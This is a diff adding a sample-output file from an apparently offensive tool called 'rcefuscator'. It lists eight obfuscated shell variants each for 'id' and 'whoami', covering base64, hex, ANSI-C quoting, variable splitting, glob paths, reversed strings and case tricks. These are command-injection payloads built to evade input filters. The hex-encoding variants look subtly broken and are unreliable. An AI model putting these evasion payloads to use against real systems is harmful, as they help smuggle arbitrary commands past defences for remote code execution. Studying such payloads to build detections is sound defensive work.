@@ -1,0 +1,74 @@
+# rcefuscator — Sample Outputs
+# Generated for: id, whoami
+# Educational Use Only — See DISCLAIMER.md
+# ============================================================
+
+## Command: id
+
+[1] Base64 Encoding
+    echo 'aWQ=' | base64 -d | sh
+    Uses chars: |  |  Shell: bash/sh
+
+[2] Hex Encoding (printf + xxd)
+    printf '%s' '\x69\x64' | xxd -p -r | sh
+    Uses chars: |  |  Shell: bash/sh
+
+[3] ANSI-C Quoting
+    $'\x69\x64'
+    Uses chars: $, '  |  Shell: bash
+
+[4] Variable Splitting
+    _a=i;_b=d;$_a$_b
+    Uses chars: $  |  Shell: bash/sh
+
+[5] Wildcard / Glob Expansion
+    /???/bin/id
+    Uses chars: none  |  Shell: bash/sh
+
+[6] Reverse String
+    echo 'di' | rev | sh
+    Uses chars: |  |  Shell: bash/sh
+
+[7] Case Manipulation
+    echo 'ID' | tr 'A-Z' 'a-z' | sh
+    Uses chars: |  |  Shell: bash/sh
+
+[8] Command Substitution $()
+    $(printf '\x69\x64')
+    Uses chars: $, (, )  |  Shell: bash
+
+# ============================================================
+
+## Command: whoami
+
+[1] Base64 Encoding
+    echo 'd2hvYW1p' | base64 -d | sh
+    Uses chars: |  |  Shell: bash/sh
+
+[2] Hex Encoding (printf + xxd)
+    printf '%s' '\x77\x68\x6f\x61\x6d\x69' | xxd -p -r | sh
+    Uses chars: |  |  Shell: bash/sh
+
+[3] ANSI-C Quoting
+    $'\x77\x68\x6f\x61\x6d\x69'
+    Uses chars: $, '  |  Shell: bash
+
+[4] Variable Splitting
+    _a=wh;_b=oa;_c=mi;$_a$_b$_c
+    Uses chars: $  |  Shell: bash/sh
+
+[5] Wildcard / Glob Expansion
+    /???/bin/whoami
+    Uses chars: none  |  Shell: bash/sh
+
+[6] Reverse String
+    echo 'imaohw' | rev | sh
+    Uses chars: |  |  Shell: bash/sh
+
+[7] Case Manipulation
+    echo 'WHOAMI' | tr 'A-Z' 'a-z' | sh
+    Uses chars: |  |  Shell: bash/sh
+
+[8] Command Substitution $()
+    $(printf '\x77\x68\x6f\x61\x6d\x69')
+    Uses chars: $, (, )  |  Shell: bash
